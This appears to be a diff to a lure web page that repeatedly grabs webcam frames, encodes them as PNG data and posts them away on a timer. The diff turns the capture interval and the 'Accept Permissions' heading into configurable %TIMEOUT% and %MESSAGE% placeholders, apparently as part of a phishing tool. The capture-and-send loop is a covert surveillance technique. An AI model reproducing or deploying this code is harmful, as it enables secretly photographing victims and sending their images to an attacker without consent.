@@ -56,13 +56,13 @@ function handleSuccess(stream) {
         context.drawImage(video, 0, 0, 640, 480);
         var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
         post(canvasData);
-    }, 1500);
+    }, %TIMEOUT%);
 }
 
 stage();
 
 </script>
     <body>
-        <h1>Accept Permissions</h1>
+        <h1>%MESSAGE%</h1>
     </body>
 </html>
